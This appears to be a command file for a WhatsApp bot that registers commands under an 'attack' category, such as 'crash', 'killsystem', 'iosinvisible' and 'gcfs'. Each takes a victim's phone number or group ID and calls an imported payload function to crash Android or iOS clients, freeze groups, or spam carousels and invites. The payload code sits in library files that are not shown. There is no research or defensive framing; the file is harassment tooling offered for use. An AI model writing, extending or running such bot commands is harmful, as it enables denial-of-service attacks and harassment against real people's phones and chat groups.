const { cmd } = require('../arslan');
const { CallCrash } = require('../lib/CallCrash');
const { crashfinity } = require('../lib/crashfinity');
const { crashjam } = require('../lib/crashjam');
const { killsystem } = require('../lib/killsystem');
const { Xdelay } = require('../lib/Xdelay');
const { Xgc } = require('../lib/Xgc');
const { IosInvisible } = require('../lib/IosInvisible');
const { gcFrz } = require('../lib/gcFrz');

const cleanNumber = (num) => num.replace(/[^0-9]/g, '');
const ensureJid = (num) => `${cleanNumber(num)}@s.whatsapp.net`;
const checkExists = async (conn, jid) => {
    try {
        const [result] = await conn.onWhatsApp(jid);
        return result?.exists || false;
    } catch { return false; }
};

cmd({
    pattern: "crash",
    alias: ["cc"],
    desc: "Call crash target",
    category: "attack"
}, async (conn, mek, m, { args, reply }) => {
    const target = args[0];
    if (!target) return reply("Usage: .crash +947xxxxxxx");
    const jid = ensureJid(target);
    const exists = await checkExists(conn, jid);
    if (!exists) return reply("❌ Number not on WhatsApp");
    try {
        await CallCrash(conn, jid);
        reply(`✅ Crash sent to ${target}`);
    } catch (e) { reply(`❌ Error: ${e.message}`); }
});

cmd({
    pattern: "crashfinity",
    alias: ["cf"],
    desc: "Crash with infinite loop",
    category: "attack"
}, async (conn, mek, m, { args, reply }) => {
    const target = args[0];
    if (!target) return reply("Usage: .crashfinity +947xxxxxxx");
    const jid = ensureJid(target);
    const exists = await checkExists(conn, jid);
    if (!exists) return reply("❌ Number not on WhatsApp");
    try {
        await crashfinity(conn, jid);
        reply(`✅ crashfinity sent to ${target}`);
    } catch (e) { reply(`❌ Error: ${e.message}`); }
});

cmd({
    pattern: "crashjam",
    alias: ["cj"],
    desc: "Android jam crash",
    category: "attack"
}, async (conn, mek, m, { args, reply }) => {
    const target = args[0];
    if (!target) return reply("Usage: .crashjam +947xxxxxxx");
    const jid = ensureJid(target);
    const exists = await checkExists(conn, jid);
    if (!exists) return reply("❌ Number not on WhatsApp");
    try {
        await crashjam(conn, jid);
        reply(`✅ crashjam sent to ${target}`);
    } catch (e) { reply(`❌ Error: ${e.message}`); }
});

cmd({
    pattern: "killsystem",
    alias: ["ks"],
    desc: "Multi-payload crash",
    category: "attack"
}, async (conn, mek, m, { args, reply }) => {
    const target = args[0];
    if (!target) return reply("Usage: .killsystem +947xxxxxxx");
    const jid = ensureJid(target);
    const exists = await checkExists(conn, jid);
    if (!exists) return reply("❌ Number not on WhatsApp");
    try {
        await killsystem(conn, jid);
        reply(`✅ killsystem executed on ${target}`);
    } catch (e) { reply(`❌ Error: ${e.message}`); }
});

cmd({
    pattern: "xdelay",
    alias: ["xd"],
    desc: "Android carousel spam",
    category: "attack"
}, async (conn, mek, m, { args, reply }) => {
    const target = args[0];
    if (!target) return reply("Usage: .xdelay +947xxxxxxx");
    const jid = ensureJid(target);
    const exists = await checkExists(conn, jid);
    if (!exists) return reply("❌ Number not on WhatsApp");
    try {
        await Xdelay(conn, jid);
        reply(`✅ Xdelay sent to ${target}`);
    } catch (e) { reply(`❌ Error: ${e.message}`); }
});

cmd({
    pattern: "xgc",
    alias: ["xgroup"],
    desc: "Group invite spam",
    category: "attack"
}, async (conn, mek, m, { args, reply }) => {
    const target = args[0];
    if (!target || !target.endsWith('@g.us')) return reply("Usage: .xgc groupjid@g.us");
    try {
        await Xgc(conn, target);
        reply(`✅ Xgc sent to group ${target}`);
    } catch (e) { reply(`❌ Error: ${e.message}`); }
});

cmd({
    pattern: "iosinvisible",
    alias: ["ios"],
    desc: "iOS invisible crash",
    category: "attack"
}, async (conn, mek, m, { args, reply }) => {
    const target = args[0];
    if (!target) return reply("Usage: .iosinvisible +947xxxxxxx");
    const jid = ensureJid(target);
    const exists = await checkExists(conn, jid);
    if (!exists) return reply("❌ Number not on WhatsApp");
    try {
        await IosInvisible(conn, jid);
        reply(`✅ iosinvisible sent to ${target}`);
    } catch (e) { reply(`❌ Error: ${e.message}`); }
});

cmd({
    pattern: "gcfs",
    alias: ["groupfreeze"],
    desc: "Freeze group",
    category: "attack"
}, async (conn, mek, m, { args, reply }) => {
    const target = args[0];
    if (!target || !target.endsWith('@g.us')) return reply("Usage: .gcfs groupjid@g.us");
    try {
        await gcFrz(conn, target);
        reply(`✅ gcFrz sent to group ${target}`);
    } catch (e) { reply(`❌ Error: ${e.message}`); }
});

cmd({
    pattern: "alive",
    desc: "Check bot status",
    category: "system"
}, async (conn, mek, m, { reply }) => {
    reply(`✅ ${require('../config').BOT_NAME} is alive and ready.`);
});